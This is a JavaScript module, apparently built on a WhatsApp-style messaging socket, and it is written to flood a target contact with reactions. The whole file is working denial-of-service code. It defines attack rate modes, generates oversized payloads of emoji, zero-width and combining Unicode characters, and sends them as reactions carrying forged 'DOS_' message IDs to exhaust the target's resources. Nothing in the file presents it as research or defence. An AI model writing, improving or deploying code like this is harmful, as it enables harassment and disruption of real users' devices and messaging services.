export const EXHAUST_MODES = {
    aggressive: {
        payloadSize: 1000,
        rate: 250,          // target reactions per second
        delayMs: 4          // delay between sends
    },
    slow: {
        payloadSize: 500,
        rate: 10,
        delayMs: 100
    }
};

/**
 * Generate oversized payload with unicode characters
 */
export function generateExhaustPayload(size) {
    const patterns = [
        () => String.fromCharCode(0x1F600 + (Math.random() * 80 | 0)),
        () => '\u200B\u200C\u200D\uFEFF',
        () => String.fromCharCode(0x0300 + (Math.random() * 112 | 0)),
    ];

    let payload = '';
    while (payload.length < size) {
        const pattern = patterns[Math.floor(Math.random() * patterns.length)];
        payload += pattern();
    }
    return payload.substring(0, size);
}

/**
 * Send a single oversized reaction payload to exhaust target resources
 */
export async function sendOversizedReaction(sock, targetJid, payloadSize) {
    const fakeId = 'DOS_' + Date.now() + '_' + Math.random().toString(36).substring(7);
    const fakeKey = {
        remoteJid: targetJid,
        fromMe: true,
        id: fakeId
    };

    const payload = generateExhaustPayload(payloadSize);

    await Promise.race([
        sock.sendMessage(targetJid, {
            react: {
                text: payload,
                key: fakeKey
            }
        }),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
    ]);
}
